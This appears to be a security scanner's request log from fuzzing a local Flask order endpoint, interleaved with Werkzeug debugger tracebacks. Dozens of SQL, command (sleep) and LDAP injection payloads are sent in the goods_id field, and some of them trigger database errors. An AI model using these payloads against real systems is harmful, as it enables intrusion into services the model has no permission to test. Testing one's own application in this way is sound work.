  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">729</em>,
      in <code class="function">_read_packet</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>packet = packet_type(bytes(buff), self.encoding)</pre>
<pre class="line before"><span class="ws">        </span>if packet.is_error_packet():</pre>
<pre class="line before"><span class="ws">            </span>if self._result is not None and self._result.unbuffered_active is True:</pre>
<pre class="line before"><span class="ws">                </span>self._result.unbuffered_active = False</pre>
<pre class="line current"><span class="ws">            </span>packet.raise_for_error()
<span class="ws">            </span>^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return packet</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def _read_bytes(self, num_bytes):</pre>
<pre class="line after"><span class="ws">        </span>self._sock.settimeout(self._read_timeout)</pre>
<pre class="line after"><span class="ws">        </span>while True:</pre></div>
</div>

<li><div class="frame" id="frame-1754718681648">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\protocol.py"</cite>,
      line <em class="line">221</em>,
      in <code class="function">raise_for_error</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.rewind()</pre>
<pre class="line before"><span class="ws">        </span>self.advance(1)  # field_count == error (we already know that)</pre>
<pre class="line before"><span class="ws">        </span>errno = self.read_uint16()</pre>
<pre class="line before"><span class="ws">        </span>if DEBUG:</pre>
<pre class="line before"><span class="ws">            </span>print(&#34;errno =&#34;, errno)</pre>
<pre class="line current"><span class="ws">        </span>err.raise_mysql_exception(self._data)
<span class="ws">        </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def dump(self):</pre>
<pre class="line after"><span class="ws">        </span>dump_packet(self._data)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754718679344">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\err.py"</cite>,
      line <em class="line">143</em>,
      in <code class="function">raise_mysql_exception</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>errno = struct.unpack(&#34;&lt;h&#34;, data[1:3])[0]</pre>
<pre class="line before"><span class="ws">    </span>errval = data[9:].decode(&#34;utf-8&#34;, &#34;replace&#34;)</pre>
<pre class="line before"><span class="ws">    </span>errorclass = error_map.get(errno)</pre>
<pre class="line before"><span class="ws">    </span>if errorclass is None:</pre>
<pre class="line before"><span class="ws">        </span>errorclass = InternalError if errno &lt; 1000 else OperationalError</pre>
<pre class="line current"><span class="ws">    </span>raise errorclass(errno, errval)
<span class="ws">    </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
</div>
</ul>
  <blockquote>pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1;SELECT%20*\n&#39;&#34;)
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2213, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2193, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2190, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1484, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;E:\classPro\1204Pro\orderApp\server.py&#34;, line 116, in create
    cursor.execute(sql, val)
  File &#34;D:\python3\Lib\site-packages\dbutils\steady_db.py&#34;, line 691, in tough_method
    raise error  # re-raise the original error again
  File &#34;D:\python3\Lib\site-packages\dbutils\steady_db.py&#34;, line 610, in tough_method
    result = method(*args, **kwargs)  # try to execute
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\cursors.py&#34;, line 158, in execute
    result = self._query(query)
             ^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\cursors.py&#34;, line 325, in _query
    conn.query(q)
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 549, in query
    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 779, in _read_query_result
    result.read()
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 1157, in read
    first_packet = self.connection._read_packet()
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 729, in _read_packet
    packet.raise_for_error()
  File &#34;D:\python3\Lib\site-packages\pymysql\protocol.py&#34;, line 221, in raise_for_error
    err.raise_mysql_exception(self._data)
  File &#34;D:\python3\Lib\site-packages\pymysql\err.py&#34;, line 143, in raise_mysql_exception
    raise errorclass(errno, errval)
pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1;SELECT%20*\n&#39;&#34;)
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "D:\python3\Lib\site-packages\flask\app.py", line 2213, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 2193, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 2190, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1484, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\classPro\1204Pro\orderApp\server.py", line 116, in create
    cursor.execute(sql, val)
  File "D:\python3\Lib\site-packages\dbutils\steady_db.py", line 691, in tough_method
    raise error  # re-raise the original error again
  File "D:\python3\Lib\site-packages\dbutils\steady_db.py", line 610, in tough_method
    result = method(*args, **kwargs)  # try to execute
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\cursors.py", line 158, in execute
    result = self._query(query)
             ^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\cursors.py", line 325, in _query
    conn.query(q)
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 549, in query
    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 779, in _read_query_result
    result.read()
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 1157, in read
    first_packet = self.connection._read_packet()
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 729, in _read_packet
    packet.raise_for_error()
  File "D:\python3\Lib\site-packages\pymysql\protocol.py", line 221, in raise_for_error
    err.raise_mysql_exception(self._data)
  File "D:\python3\Lib\site-packages\pymysql\err.py", line 143, in raise_mysql_exception
    raise errorclass(errno, errval)
pymysql.err.OperationalError: (1292, "Truncated incorrect DOUBLE value: '1;SELECT%20*\n'")


-->

[INFO]00:18:08:404-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "to_timestamp_tz\n"}}
[INFO]00:18:08:404-caseScan.py:113 >> code: 403
[INFO]00:18:08:405-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:433-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "tz_offset\n"}}
[INFO]00:18:08:433-caseScan.py:113 >> code: 403
[INFO]00:18:08:434-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:463-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "&lt;&gt;&quot;'%;)(&amp;+\n"}}
[INFO]00:18:08:464-caseScan.py:113 >> code: 403
[INFO]00:18:08:465-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:494-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'%20or%201=1\n"}}
[INFO]00:18:08:495-caseScan.py:113 >> code: 403
[INFO]00:18:08:495-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:522-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%27%20or%201=1\n"}}
[INFO]00:18:08:523-caseScan.py:113 >> code: 403
[INFO]00:18:08:523-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:553-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%20$(sleep%2050)\n"}}
[INFO]00:18:08:553-caseScan.py:113 >> code: 403
[INFO]00:18:08:554-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:583-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%20'sleep%2050'\n"}}
[INFO]00:18:08:584-caseScan.py:113 >> code: 403
[INFO]00:18:08:584-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:612-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "char%4039%41%2b%40SELECT\n"}}
[INFO]00:18:08:613-caseScan.py:113 >> code: 403
[INFO]00:18:08:614-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:643-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "&apos;%20OR\n"}}
[INFO]00:18:08:644-caseScan.py:113 >> code: 403
[INFO]00:18:08:645-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:674-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'sqlattempt1\n"}}
[INFO]00:18:08:675-caseScan.py:113 >> code: 403
[INFO]00:18:08:676-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:705-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "(sqlattempt2)\n"}}
[INFO]00:18:08:706-caseScan.py:113 >> code: 403
[INFO]00:18:08:706-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:737-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "|\n"}}
[INFO]00:18:08:737-caseScan.py:113 >> code: 403
[INFO]00:18:08:738-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:769-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%7C\n"}}
[INFO]00:18:08:769-caseScan.py:113 >> code: 403
[INFO]00:18:08:770-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:798-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "*|\n"}}
[INFO]00:18:08:799-caseScan.py:113 >> code: 403
[INFO]00:18:08:799-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:830-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%2A%7C\n"}}
[INFO]00:18:08:830-caseScan.py:113 >> code: 403
[INFO]00:18:08:831-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:866-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "*(|(mail=*))\n"}}
[INFO]00:18:08:867-caseScan.py:113 >> code: 403
[INFO]00:18:08:867-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:897-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%2A%28%7C%28mail%3D%2A%29%29\n"}}
[INFO]00:18:08:898-caseScan.py:113 >> code: 403
[INFO]00:18:08:899-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:932-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "*(|(objectclass=*))\n"}}
[INFO]00:18:08:933-caseScan.py:113 >> code: 403
[INFO]00:18:08:933-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:966-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%2A%28%7C%28objectclass%3D%2A%29%29\n"}}
[INFO]00:18:08:966-caseScan.py:113 >> code: 403
[INFO]00:18:08:967-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:08:998-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "(\n"}}
[INFO]00:18:08:999-caseScan.py:113 >> code: 403
[INFO]00:18:08:999-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:030-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%28\n"}}
[INFO]00:18:09:030-caseScan.py:113 >> code: 403
[INFO]00:18:09:031-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:061-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": ")\n"}}
[INFO]00:18:09:062-caseScan.py:113 >> code: 403
[INFO]00:18:09:062-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:092-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%29\n"}}
[INFO]00:18:09:092-caseScan.py:113 >> code: 403
[INFO]00:18:09:093-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:122-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "&\n"}}
[INFO]00:18:09:123-caseScan.py:113 >> code: 403
[INFO]00:18:09:123-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:153-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%26\n"}}
[INFO]00:18:09:153-caseScan.py:113 >> code: 403
[INFO]00:18:09:154-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:182-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "!\n"}}
[INFO]00:18:09:183-caseScan.py:113 >> code: 403
[INFO]00:18:09:183-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:213-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%21\n"}}
[INFO]00:18:09:214-caseScan.py:113 >> code: 403
[INFO]00:18:09:214-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:244-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 1=1 or ''='\n"}}
[INFO]00:18:09:245-caseScan.py:113 >> code: 403
[INFO]00:18:09:245-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:273-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or ''='\n"}}
[INFO]00:18:09:274-caseScan.py:113 >> code: 403
[INFO]00:18:09:274-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:304-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "x' or 1=1 or 'x'='y\n"}}
[INFO]00:18:09:304-caseScan.py:113 >> code: 403
[INFO]00:18:09:305-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:334-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "/\n"}}
[INFO]00:18:09:335-caseScan.py:113 >> code: 403
[INFO]00:18:09:335-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:365-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "//\n"}}
[INFO]00:18:09:365-caseScan.py:113 >> code: 403
[INFO]00:18:09:366-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:396-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "//*\n"}}
[INFO]00:18:09:397-caseScan.py:113 >> code: 403
[INFO]00:18:09:397-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:428-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "*/*\n"}}
[INFO]00:18:09:429-caseScan.py:113 >> code: 403
[INFO]00:18:09:429-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:460-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'\n"}}
[INFO]00:18:09:460-caseScan.py:113 >> code: 403
[INFO]00:18:09:461-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:492-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' and '' like '\n"}}
[INFO]00:18:09:493-caseScan.py:113 >> code: 403
[INFO]00:18:09:493-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:527-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' AnD '' like '\n"}}
[INFO]00:18:09:527-caseScan.py:113 >> code: 403
[INFO]00:18:09:528-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:557-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or '' like '\n"}}
[INFO]00:18:09:557-caseScan.py:113 >> code: 403
[INFO]00:18:09:558-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:589-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' and '' like '%\n"}}
[INFO]00:18:09:590-caseScan.py:113 >> code: 403
[INFO]00:18:09:590-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:620-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' aND '' like '%\n"}}
[INFO]00:18:09:621-caseScan.py:113 >> code: 403
[INFO]00:18:09:621-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:649-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' and '' like ''--\n"}}
[INFO]00:18:09:650-caseScan.py:113 >> code: 403
[INFO]00:18:09:650-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:681-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' and 2>1--\n"}}
[INFO]00:18:09:682-caseScan.py:113 >> code: 403
[INFO]00:18:09:682-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:712-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' and 2>3--\n"}}
[INFO]00:18:09:712-caseScan.py:113 >> code: 403
[INFO]00:18:09:713-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:741-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "') and ('x'='x\n"}}
[INFO]00:18:09:741-caseScan.py:113 >> code: 403
[INFO]00:18:09:742-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:770-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": ") and (1=1\n"}}
[INFO]00:18:09:771-caseScan.py:113 >> code: 403
[INFO]00:18:09:771-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:801-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'or''='\n"}}
[INFO]00:18:09:802-caseScan.py:113 >> code: 403
[INFO]00:18:09:802-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:832-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'or'='or'\n"}}
[INFO]00:18:09:833-caseScan.py:113 >> code: 403
[INFO]00:18:09:833-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:867-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "a' or 1=1--\n"}}
[INFO]00:18:09:868-caseScan.py:113 >> code: 403
[INFO]00:18:09:868-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:900-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\"a\"\" or 1=1--\"\n"}}
[INFO]00:18:09:900-caseScan.py:113 >> code: 403
[INFO]00:18:09:901-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:930-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": " or a = a\n"}}
[INFO]00:18:09:931-caseScan.py:113 >> code: 403
[INFO]00:18:09:932-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:09:962-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "a' or 'a' = 'a\n"}}
[INFO]00:18:09:962-caseScan.py:113 >> code: 403
[INFO]00:18:09:963-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:10:043-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "1 or 1=1\n"}}
[INFO]00:18:10:044-caseScan.py:113 >> code: 500
[INFO]00:18:10:044-caseScan.py:114 >> response: <!doctype html>
<html lang=en>
  <head>
    <title>pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1 or 1=1\n&#39;&#34;)
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "f14cIhWZsCFSqB7Czdcp";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>OperationalError</h1>
<div class="detail">
  <p class="errormsg">pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1 or 1=1\n&#39;&#34;)
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
